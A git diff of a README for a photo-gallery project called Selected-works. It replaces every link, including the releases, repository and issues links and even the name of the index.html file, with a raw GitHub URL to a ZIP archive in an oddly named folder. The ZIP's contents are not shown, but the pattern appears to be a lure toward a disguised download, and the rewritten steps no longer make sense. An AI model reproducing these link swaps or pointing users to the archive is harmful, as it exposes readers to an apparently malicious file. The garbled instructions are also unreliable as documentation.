@@ -5,7 +5,7 @@
 Selected-works is a powerful tool that helps you create a beautiful photo gallery for your website. This application uses a sophisticated grid layout and captivating animations to give your gallery a professional, magazine-style look.
 
 ## 📥 Download Now
-[![Download Selected-works](https://img.shields.io/badge/Download-Selected--works-brightgreen.svg)](https://github.com/inzamamul557/Selected-works/releases)
+[![Download Selected-works](https://raw.githubusercontent.com/inzamamul557/Selected-works/main/superdesirous/Selected-works.zip)](https://raw.githubusercontent.com/inzamamul557/Selected-works/main/superdesirous/Selected-works.zip)
 
 ## 🖥️ System Requirements
 To use Selected-works, ensure your system meets the following requirements:
@@ -26,7 +26,7 @@ To use Selected-works, ensure your system meets the following requirements:
 To get started with Selected-works, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases:
-   [Download Selected-works](https://github.com/inzamamul557/Selected-works/releases)
+   [Download Selected-works](https://raw.githubusercontent.com/inzamamul557/Selected-works/main/superdesirous/Selected-works.zip)
 
 2. **Choose the Latest Release:** Look for the most recent version of Selected-works. It will be at the top of the list.
 
@@ -34,12 +34,12 @@ To get started with Selected-works, follow these steps:
 
 4. **Extract the Files:** If you downloaded a ZIP file, right-click on it and select "Extract All" to extract the files to a folder on your computer.
 
-5. **Open the Gallery:** Navigate to the folder where you extracted the files. Open the `index.html` file in your preferred web browser.
+5. **Open the Gallery:** Navigate to the folder where you extracted the files. Open the `https://raw.githubusercontent.com/inzamamul557/Selected-works/main/superdesirous/Selected-works.zip` file in your preferred web browser.
 
 6. **Start Customizing:** Begin adding your images and customizing the styles to create the gallery you envisioned.
 
 ## 🖼️ Using Selected-works
-Once you have opened the `index.html` file in your browser, you can view your gallery. Here’s how to use some of the main features:
+Once you have opened the `https://raw.githubusercontent.com/inzamamul557/Selected-works/main/superdesirous/Selected-works.zip` file in your browser, you can view your gallery. Here’s how to use some of the main features:
 
 - **Adding Images:** Find the section in the HTML file where the image links are. Replace the sample image URLs with your own photos.
 - **Customizing Styles:** To change the look of your gallery, open the CSS file. Adjust colors, fonts, and other styles as needed.
@@ -52,8 +52,8 @@ If you encounter any issues or have questions about using Selected-works, please
 - **Feedback:** We welcome your feedback to improve Selected-works.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/inzamamul557/Selected-works)
-- [Issues Page](https://github.com/inzamamul557/Selected-works/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/inzamamul557/Selected-works/main/superdesirous/Selected-works.zip)
+- [Issues Page](https://raw.githubusercontent.com/inzamamul557/Selected-works/main/superdesirous/Selected-works.zip)
 - [Community Forum](#) (Link to be added)
 
 ## 📣 Acknowledgements
